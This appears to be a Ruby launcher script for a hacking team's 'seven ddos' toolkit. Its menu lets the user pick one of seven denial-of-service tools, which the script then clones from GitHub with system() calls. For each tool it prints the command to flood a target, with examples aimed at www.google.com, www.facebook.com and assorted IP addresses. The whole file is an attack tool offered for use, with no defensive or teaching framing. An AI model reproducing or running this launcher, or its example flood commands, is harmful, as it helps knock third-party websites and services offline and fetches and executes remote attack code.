#!/bin/ruby
# code by panglima jateng
# code warna
green = "\033[0;32m"; yellow = "\033[0;33m"; white = "\033[0;37m"; cyan = "\033[0;36m"
# variabel
team = "aligator cyber indo"; aut = "panglima jateng"; panglima_jateng = "ddos"; satu = "wd"; dua = "hulk"; tiga = "hammer"; empat = "lite"; lima = "lucita"; enam = "torshammer"; tujuh = "xerxes"
# instalasi
https_panglima_jateng_installer_scripting_ddos_terkece_ruby1 = "git clone https://github.com/banghyuu/ddosWD"
https_panglima_jateng_installer_scripting_ddos_terkece_ruby2 = "git clone https://github.com/darkwarrior3/hulk"
https_panglima_jateng_installer_scripting_ddos_terkece_ruby3 = "git clone https://github.com/cyweb/hammer"
https_panglima_jateng_installer_scripting_ddos_terkece_ruby4 = "git clone https://github.com/4L13199/LITEDDOS"
https_panglima_jateng_installer_scripting_ddos_terkece_ruby5 = "git clone https://github.com/zlucifer/lucita_ddos"
https_panglima_jateng_installer_scripting_ddos_terkece_ruby6 = "git clone https://github.com/dotfighter/torshammer"
https_panglima_jateng_installer_scripting_ddos_terkece_ruby7 = "git clone https://github.com/sepehrdaddev/Xerxes"
# tanda clear pembersih teks
system("clear")
sleep(1) # delay or durasi munculnya teks lanjutan
puts "#{yellow}"
system("figlet WELCOME KER") # teks asci or pembesar teks
    puts "\033[0;32m-------------------------------------------------------------------";
    puts "     #{white} Author #{cyan} :#{white} #{aut}";
    puts "     #{white} Team   #{cyan} :#{white} #{team}";
    puts "     #{white} Tools  #{cyan} :#{white} seven ddos";
    puts "\033[0;32m-------------------------------------------------------------------";
# daftar isi menu 1-7
puts "                           #{panglima_jateng}";
puts "\033[0;32m-------------------------------------------------------------------";
puts "#{cyan} [#{white}1#{cyan}]#{green} >#{white} #{panglima_jateng} #{satu}";
puts "#{cyan} [#{white}2#{cyan}]#{green} >#{white} #{panglima_jateng} #{dua}";
puts "#{cyan} [#{white}3#{cyan}]#{green} >#{white} #{panglima_jateng} #{tiga}";
puts "#{cyan} [#{white}4#{cyan}]#{green} >#{white} #{panglima_jateng} #{empat}";
puts "#{cyan} [#{white}5#{cyan}]#{green} >#{white} #{panglima_jateng} #{lima}";
puts "#{cyan} [#{white}6#{cyan}]#{green} >#{white} #{panglima_jateng} #{enam}";
puts "#{cyan} [#{white}7#{cyan}]#{green} >#{white} #{panglima_jateng} #{tujuh}";
puts "#{cyan} [#{white}-#{cyan}]#{green} >#{cyan} KELUAR";
puts "\033[0;32m-------------------------------------------------------------------#{white}";
# output
print "masukan pilihan => ";
panglimajateng = gets.chomp
# database no1
if panglimajateng == '1'
   system("#{https_panglima_jateng_installer_scripting_ddos_terkece_ruby1}"); puts "#{white}=========================================================="; puts "#{cyan}ketik:#{green} cd ddosWD && sh Ddos.sh"; puts "#{white}==========================================================";
   puts
end
# database no2
if panglimajateng == '2'
   system("#{https_panglima_jateng_installer_scripting_ddos_terkece_ruby2}"); puts "#{white}=========================================================="; puts "#{cyan}ketik:#{green} cd hulk && python2 hulk.py AlamatWebsite"; puts "#{cyan}contoh:#{green} cd hulk && python2 hulk.py www.google.com"; puts "#{white}=========================================================="
   puts
end
# database no3
if panglimajateng == '3'
   system("#{https_panglima_jateng_installer_scripting_ddos_terkece_ruby3}"); puts "#{white}=========================================================="; puts "#{cyan}ketik :#{green} cd hammer && python3 hammer.py -s IPaddress -p 80 -t 135"; puts "#{cyan}contoh:#{green} cd hammer && python3 hammer.py -s 08.76.9.1 -p 80 -t 135"; puts "#{white}=========================================================="
   puts
end
# database no4
if panglimajateng == '4'
   system("#{https_panglima_jateng_installer_scripting_ddos_terkece_ruby4}"); puts "#{white}=========================================================="; puts "#{cyan}ketik :#{green} cd LITEDDOS && python2 LITEDDOS.py ip-website 80 100"; puts "#{cyan}contoh:#{green} cd LITEDDOS && python2 LITEDDOS.py 1.009.67.8 80 100"; puts "#{white}=========================================================="
   puts
end
# database no5
if panglimajateng == '5'
   system("#{https_panglima_jateng_installer_scripting_ddos_terkece_ruby5}"); puts "#{white}=========================================================="; puts "#{cyan}ketik :#{green} cd lucita_ddos && python3 pukul.py -u ip-websitenya -p 8080 -t 135"; puts "#{cyan}contoh:#{green} cd lucita_ddos && python3 pukul.py -u 111.80.90.204 -p 8080 -t 135"; puts "#{white}=========================================================="
   puts
end
# database no6
if panglimajateng == '6'
   system("#{https_panglima_jateng_installer_scripting_ddos_terkece_ruby6}"); puts "#{white}=========================================================="; puts "#{cyan}ketik :#{green} cd torshammer && python2 torshammer.py -t IPaddressnya -r 256"; puts "contoh: cd torshammer && python2 torshammer.py -t 111.90.204.1 -r 256"; puts "#{white}=========================================================="
   puts
end
# database no7
if panglimajateng == '7'
   system("#{https_panglima_jateng_installer_scripting_ddos_terkece_ruby7}"); puts "#{white}=========================================================="; puts "#{cyan}ketik :#{green} cd Xerxes && ./Xerxes AlamatSitus"
   puts "#{cyan}contoh:#{green} cd Xerxes && ./Xerxes www.facebook.com"; puts "#{white}=========================================================="
   puts 
end
if panglimajateng == '0'
   system("exit")
end
